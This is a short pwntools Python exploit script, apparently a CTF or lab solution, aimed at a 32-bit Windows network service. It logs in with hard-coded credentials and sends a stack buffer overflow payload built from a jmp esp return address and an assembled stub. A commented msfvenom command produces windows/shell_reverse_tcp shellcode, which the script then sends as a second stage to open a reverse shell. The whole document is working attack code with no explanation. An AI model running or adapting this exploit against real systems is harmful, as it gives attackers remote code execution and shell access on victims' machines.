#!/usr/bin/env python3

from pwn import *


def main():
    ip, port = sys.argv[1], int(sys.argv[2])

    username = b'alfiansyah'
    password = b'K3r4j@@nM4j@pAh!T'
    fullname = b'Vickry Alfiansyah'
    code     = b'T3D83CbJkl1299'

    offset   = 52
    jmp_esp  = p32(0x7190239f)
    jmp_back = asm('jmp $-56')

    payload  = code
    payload += asm('add  esp, 0x48')
    payload += asm('pop  eax')
    payload += asm('push eax')
    payload += asm('sub  esp, 0x48')
    payload += asm('sub  esp, 0x64')
    payload += asm('xor  ebx,  ebx')
    payload += asm('push ebx')
    payload += asm('add   bh, 0x04')
    payload += asm('push ebx')
    payload += asm('mov  ebx,  esp')
    payload += asm('add  ebx, 0x64')
    payload += asm('push ebx')
    payload += asm('push eax')
    payload += asm('mov  eax, ds:0x719082ac')
    payload += asm('call eax')
    payload += b'\x90' * (offset + len(code) - len(payload))
    payload += jmp_esp
    payload += jmp_back
    payload += b'\x90' * 8

    r = remote(ip, port)

    r.sendlineafter(b'Username: ', username)
    r.sendlineafter(b'Password: ', password)
    r.sendlineafter(b'FullName: ', fullname)
    r.sendlineafter(b'Input Your Code: ', payload)

    # msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -f raw -o shellcode.bin
    with open('shellcode.bin', 'rb') as f:
        shellcode = f.read()

    sleep(1)
    r.sendline(shellcode)


if __name__ == '__main__':
    main()
